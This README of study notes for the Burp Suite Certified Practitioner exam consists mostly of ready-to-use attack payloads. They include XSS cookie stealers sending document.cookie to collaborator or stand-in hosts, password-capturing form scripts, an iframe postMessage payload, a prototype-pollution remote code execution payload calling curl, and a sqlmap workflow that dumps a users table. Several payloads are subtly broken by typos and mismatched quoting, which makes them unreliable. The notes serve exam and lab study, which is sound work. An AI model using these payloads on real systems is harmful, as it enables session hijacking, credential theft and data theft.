# BSCP_Notes
Notes for Burp Suite Certified Practitioner

- The repository is for learning purpose only
- The payloads and attack patterns defined here should only be used in ethical way
- Make sure you use these notes as a guide only
- Try to make your own customized notes
- There are 4 xmind files which consist of exploit techniques, payloads, tips techniques for cracking the exam:
  - Advance Topics
  - Server-Side Vulnerabilities
  - Client-Side Vulnerabilities
  - Tools and payloads for the exam


## XSS Paylodas for stealing cookies

### Exploits for stealing cookie via XSS
If you find these exploits as applicable, make sure to try with both:
- Exploit server
- COLLABORATOR  

### Using fetch method and defining the POST Method

`<script>
fetch(`https://burpcollaborator.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>`

### Using fetch method

`<script>
fetch(`https://collaborator.net/?x=`+document.cookie);
</script>`

### XSS Cookie Stealer payloads using JavaScript

`JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie`

### Reflected XSS into HTML context with nothing encoded in search.

`<script>document.location='https://COLLABORATOR.com?c='+document.cookie</script>`

### Reflected DOM XSS, into JSON data that is processed by eval().

`\"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//`

### JavaScript Template literals are enclosed by backtick ( \` ) characters instead of double or single quotes.

`${document.location='https://tvsw9dim0doynnpscx9mgtq67xdo1jp8.oastify.com/?cookies='+document.cookie;}`

### AngularJS DOM XSS Attack constructor payloads

`{{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}``

### Web Cache Parameter cloaking - script /js/geolocate.js, executing the callback function setCountryCookie()

`GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=document.location='http://BURPCOL.oastify.com/?StealCookies=' document.cookie ;//`

### More Cross-Site Scripting (XSS) example cookie stealer payloads.

`<script>
document.location='https://Collaborator.com/?cookiestealer='+document.cookie;
</script>`

###HTML  Tag, with invalid Image source, with escape sequence from source code calling window.location for the **LastViewedProduct cookie.

`&'><img src=1 onerror=print()>``
`&'><img src=x onerror=this.src="https://exploit-0a6b000b033762e6c0fa121d01fc0020.exploit-server.net/?ex="+document.cookie>`
`<img src=x onerror=this.src=https://exploit.net/?'+document.cookie;>``

### Document.location returns a Location object, which contains information about the URL of the document and provides methods for changing that URL and loading another URL.

```
document.location='https://burp-collab.x.com/cookiestealer.php?c='+document.cookie;
document.location='https://BurpCollaBoRaTor.oastify.com/?FreeCookies='+document.cookie;
Document.write

/?evil='/><script>document.write('<img src="https://exploit.com/steal.MY?cookie=' document.cookie '" />')</script>
<script>
    document.location=""http://stock.lab.web-security-academy.net/?productId=4
            <script>
                    var req = new XMLHttpRequest();
                    req.onload = reqListener;
                    req.open('get','https://lab.web-security-academy.net/accountDetails',true);
                    req.withCredentials = true;
                    req.send();
                    function reqListener() {
                            location='https://exploit.web-security-academy.net/log?key='%2bthis.responseText;
                    };
            %3c/script>
            &storeId=1""
</script>

<script>
fetch(‘https://burpcollaborator.net’, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>
<script>
  fetch('https://COLLABORATOR.com', {
  method: 'POST',
  mode: 'no-cors',
  body:'PeanutButterCookies='+document.cookie
  });
</script>
x"); var fuzzer=new Image;fuzzer.src="https://COLLABORATOR.com/?"+document.cookie; //
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

```

### OSCP Offsec PWK hand book cookie stealer example

`<script>new Image().src="http://Collaborator.COM/cool.jpg?output="+document.cookie;</script>`

### Alt Cookie Stealer

```
?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.bad/?'+document.cookie;>
<script>
document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" />');
</script>
<script>
fetch('https://BURP-COLLABORATOR', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

### Steal Password / Cookie Stealer ::::

#### XMLHttpRequest

```
<input name=username id=username>
<input type=password name=password id=password onhcange="CaptureFunction()">
<script>
function CaptureFunction()
{
var user = document.getElementById('username').value;
var pass = document.getElementById('password').value;
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://exploit.com/?username=" + user + "&password=" + pass, true);
xhr.send();
}
</script>
```

#### FETCH API

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

### DATA EXFILTRATION / COOKIE STEALER ::::

```
  </textarea><script>fetch('http://exploit.evil?cookie=' + btoa(document.cookie) );</script>
<script>document.write('<img src="http://evil.net/submitcookie.php?cookie=' + escape(document.cookie) + '" />');</script>
<script>
document.write('<img src="HTTPS://EXPLOIT.net/?c='+document.cookie+'" />');
</script>
<script>document.write('<img src="https://EXPLOIT.net/?c='%2bdocument.cookie%2b'" />');</script>
```

### IFRAMEs

```
<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
    "type": "load-channel",
    "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
}), "*");'>
```

### Javascript set test cookie in current browser session with no HttpOnly flag to allow proof of concept cookie stealer.

`ocument.cookie = "TopSecretCookie=HackThePlanetWithPeanutButter";`

### Prompt Validation payload, does not steal cookie or send it to exploit server.

`<img src=x onerror=prompt(1)>`

## Remote code execution via server-side prototype pollution

```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```

## SQLMAP workflow

In the dev Tools, copy the request you want to attack as curl and then paste it as the payloads like:

```
sqlmap -u '<copied data>'  -p <parameter you want to attack> --batch
```

Other useful commands to follow after getting some basic info, this flows from getting the database information, then getting table names, etc.
`--flush-session --dbms postgresql --technique E --level 5`

and now modify the command to dump out dbms: 
 `--dbms postgresql --technique E --level 5 --dbs`

  Now get the tables about the database: 

`--dbms postgresql --technique E --level 5 -D public --tables`

Now retrieve info about the users:
`--dbms postgresql --technique E --level 5 -D public --T users --dump`
